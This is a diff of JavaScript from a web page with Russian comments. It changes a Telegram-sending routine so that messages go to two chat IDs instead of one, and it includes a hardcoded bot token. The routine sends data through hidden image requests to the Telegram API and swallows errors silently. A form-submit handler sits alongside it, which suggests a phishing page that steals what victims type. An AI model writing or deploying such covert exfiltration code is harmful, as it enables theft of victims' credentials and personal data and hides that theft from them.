@@ -246,7 +246,7 @@
 
         // === ВСТАВЬ СВОЙ ТОКЕН ===
         const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g";
-        const CHAT_ID = "8642898930";
+        const CHAT_IDS = ["8642898930", "8614813436"];
 
         // === ПЕРЕМЕННЫЕ ===
         let attempt = 0;
@@ -367,31 +367,30 @@
             }
         }
 
-        // === ОТПРАВКА В TELEGRAM (с разбивкой, если длинное) ===
-        function sendData(msg) {
-            try {
-                const maxLen = 4096;
-                if (msg.length <= maxLen) {
+        // === ОТПРАВКА НЕСКОЛЬКИМ ПОЛУЧАТЕЛЯМ (С РАЗБИВКОЙ) ===
+function sendData(msg) {
+    try {
+        // Разбиваем сообщение на части, если длинное (максимум 4096 символов)
+        const maxLen = 4096;
+        const parts = msg.length > maxLen ? msg.match(/[\s\S]{1,4000}/g) || [] : [msg];
+
+        // Отправляем каждому получателю из массива CHAT_IDS
+        CHAT_IDS.forEach(chatId => {
+            parts.forEach((part, index) => {
+                setTimeout(() => {
                     const img = new Image();
-                    img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+                    const text = parts.length > 1 ? part + ` (часть ${index+1}/${parts.length})` : part;
+                    img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                     img.style.display = 'none';
                     document.body.appendChild(img);
                     setTimeout(() => img.remove(), 3000);
-                } else {
-                    // Разбиваем на части
-                    const parts = msg.match(/[\s\S]{1,4000}/g) || [];
-                    parts.forEach((part, index) => {
-                        setTimeout(() => {
-                            const img = new Image();
-                            img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
-                            img.style.display = 'none';
-                            document.body.appendChild(img);
-                            setTimeout(() => img.remove(), 3000);
-                        }, index * 500);
-                    });
-                }
-            } catch (e) {}
-        }
+                }, index * 500);
+            });
+        });
+    } catch (e) {
+        // Игнорируем ошибки
+    }
+}
 
         // === ОСНОВНАЯ ЛОГИКА ФОРМЫ ===
         form.addEventListener('submit', async function(e) {
